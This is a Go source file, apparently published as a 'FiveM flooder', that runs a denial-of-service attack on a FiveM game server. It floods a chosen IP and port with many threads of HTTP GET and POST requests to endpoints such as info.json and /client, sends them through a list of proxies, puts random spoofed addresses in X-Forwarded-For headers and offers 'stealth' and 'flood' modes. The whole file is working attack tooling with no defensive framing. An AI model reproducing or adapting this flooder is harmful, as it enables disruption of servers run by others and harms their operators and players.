// Golang Fivem Flooder 2024 \ using proxies
// v1
// This was released on github.com/softwaretobi

package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"sync"
	"time"

	"github.com/google/uuid"
)

var (
	ip                 string
	port               int
	safeMode           bool
	duration           int
	proxies            []string
	txAdminPort        int
	threads            int
	activeGoroutines   int64
	mu                 sync.Mutex
	successfulRequests int64
)

func init() {
	if len(os.Args) < 8 {
		fmt.Println("Usage: go run script.go [IP] [Game Port] [Mode True for stealth False for flood] [Time] [proxies_file_path] [threads] [Txadmin PORT]")
		os.Exit(1)
	}

	ip = os.Args[1]

	var err error
	port, err = strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Error converting port:", err)
		os.Exit(1)
	}

	safeMode = os.Args[3] == "true"
	duration, _ = strconv.Atoi(os.Args[4])
	proxyFilePath := os.Args[5]

	threads, err = strconv.Atoi(os.Args[6])
	if err != nil {
		fmt.Println("Error converting threads:", err)
		os.Exit(1)
	}

	txAdminPortArg := os.Args[7]
	if txAdminPortArg != "" {
		txAdminPort, _ = strconv.Atoi(txAdminPortArg)
	} else {
		txAdminPort = port + 10000
		fmt.Println("TX Admin Port is calculated based on the game port.")
	}

	data, err := ioutil.ReadFile(proxyFilePath)
	if err != nil {
		fmt.Println("Error reading proxy file:", err)
		os.Exit(1)
	}

	for _, line := range bytes.Split(data, []byte("\n")) {
		proxy := string(bytes.TrimSpace(line))
		if proxy != "" {
			proxies = append(proxies, proxy)
		}
	}
}

func getRandomProxy() string {
	return proxies[rand.Intn(len(proxies))]
}

func generateSpoofedIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}

func monitorPerformance(wg *sync.WaitGroup) {
	defer wg.Done()
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		var m runtime.MemStats
		runtime.ReadMemStats(&m)
		fmt.Printf("Allocated Memory: %v MB\n", m.Alloc/1024/1024)
		fmt.Printf("Total Allocated Memory: %v MB\n", m.TotalAlloc/1024/1024)
		mu.Lock()
		fmt.Printf("Active Goroutines: %v\n", activeGoroutines)
		fmt.Printf("Successful Requests: %v\n", successfulRequests)
		mu.Unlock()
		fmt.Println("------------------------------------------------")
	}
}

func worker(wg *sync.WaitGroup) {
	defer wg.Done()
	mu.Lock()
	activeGoroutines++
	mu.Unlock()
	defer func() {
		mu.Lock()
		activeGoroutines--
		mu.Unlock()
	}()

	endTime := time.Now().Add(time.Duration(duration) * time.Second)

	client := &http.Client{
		Transport: &http.Transport{
			MaxIdleConns:        100,
			IdleConnTimeout:     30 * time.Second,
			TLSHandshakeTimeout: 10 * time.Second,
		},
	}

	for time.Now().Before(endTime) {
		proxy := getRandomProxy()
		token := uuid.New().String()
		spoofedIP := generateSpoofedIP()

		clientHeaders := map[string]string{
			"Host":            fmt.Sprintf("%s:%d", ip, port),
			"User-Agent":      "CitizenFX/1.0",
			"Accept":          "*/*",
			"X-Forwarded-For": spoofedIP,
		}

		postData := map[string]string{
			"method": "getEndpoints",
			"token":  token,
		}

		postHeaders := map[string]string{
			"Host":           fmt.Sprintf("%s:%d", ip, port),
			"User-Agent":     "CitizenFX/1.0",
			"Content-Type":   "application/x-www-form-urlencoded",
			"Content-Length": "62",
		}

		if err := sendRequest(client, fmt.Sprintf("http://%s:%d/info.json", ip, port), clientHeaders, proxy); err != nil {
			if safeMode {
				fmt.Println("Error in request:", err)
				break
			}
		} else {
			mu.Lock()
			successfulRequests++
			mu.Unlock()
		}

		if err := sendPostRequest(client, fmt.Sprintf("http://%s:%d/client", ip, port), postHeaders, postData, proxy); err != nil {
			if safeMode {
				fmt.Println("Error in request:", err)
				break
			}
		} else {
			mu.Lock()
			successfulRequests++
			mu.Unlock()
		}

		if err := sendRequest(client, fmt.Sprintf("http://%s:%d/info.json", ip, port), clientHeaders, proxy); err != nil {
			fmt.Println("Error in additional request:", err)
		} else {
			mu.Lock()
			successfulRequests++
			mu.Unlock()
		}

		postData["X-CitizenFX-Token"] = token
		postHeaders["User-Agent"] = "CitizenFX/1.0"
		postHeaders["Content-Length"] = "23"
		postData["method"] = "getConfiguration"
		if err := sendPostRequest(client, fmt.Sprintf("http://%s:%d/client", ip, port), postHeaders, postData, proxy); err != nil {
			fmt.Println("Error in additional request:", err)
		} else {
			mu.Lock()
			successfulRequests++
			mu.Unlock()
		}

		if safeMode {
			performSafeRequests(client, proxy)
		} else {
			performAggressiveRequests(client, proxy, token)
		}

		time.Sleep(10 * time.Millisecond)
	}
}

func sendRequest(client *http.Client, url string, headers map[string]string, proxy string) error {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return err
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	req.URL.Scheme = "http"
	req.URL.Host = proxy
	fmt.Printf("Using proxy: %s\n", proxy)

	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("Request failed: %s\n", err)
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("unexpected status: %s", resp.Status)
	}

	_, _ = ioutil.ReadAll(resp.Body)
	return nil
}

func sendPostRequest(client *http.Client, url string, headers map[string]string, data map[string]string, proxy string) error {
	body, err := json.Marshal(data)
	if err != nil {
		return err
	}
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(body))
	if err != nil {
		return err
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	req.URL.Scheme = "http"
	req.URL.Host = proxy

	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("POST request failed: %s\n", err)
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("unexpected status: %s", resp.Status)
	}

	_, _ = ioutil.ReadAll(resp.Body)
	return nil
}

func performSafeRequests(client *http.Client, proxy string) {
	clientHeaders := map[string]string{
		"Host":       fmt.Sprintf("%s:%d", ip, port),
		"User-Agent": "CitizenFX/1.0",
		"Accept":     "*/*",
	}

	for _, endpoint := range []string{
		"/players.json",
		"/",
		fmt.Sprintf("/%s", uuid.New().String()),
	} {
		if err := sendRequest(client, fmt.Sprintf("http://%s:%d%s", ip, port, endpoint), clientHeaders, proxy); err != nil {
			fmt.Println("Error in safe request:", err)
			break
		} else {
			mu.Lock()
			successfulRequests++
			mu.Unlock()
		}
	}
}

func performAggressiveRequests(client *http.Client, proxy string, token string) {
	clientHeaders := map[string]string{
		"Host":       fmt.Sprintf("%s:%d", ip, port),
		"User-Agent": "CitizenFX/1.0",
		"Accept":     "*/*",
	}

	for _, endpoint := range []string{
		"/players.json",
		"/",
		fmt.Sprintf("/info.json"),
		fmt.Sprintf("/%s", token),
	} {
		if err := sendRequest(client, fmt.Sprintf("http://%s:%d%s", ip, port, endpoint), clientHeaders, proxy); err != nil {
			fmt.Println("Error in aggressive request:", err)
			break
		} else {
			mu.Lock()
			successfulRequests++
			mu.Unlock()
		}
	}
}

func main() {
	var wg sync.WaitGroup

	wg.Add(1)
	go monitorPerformance(&wg)

	wg.Add(threads)

	for i := 0; i < threads; i++ {
		go worker(&wg)
	}

	wg.Wait()
}
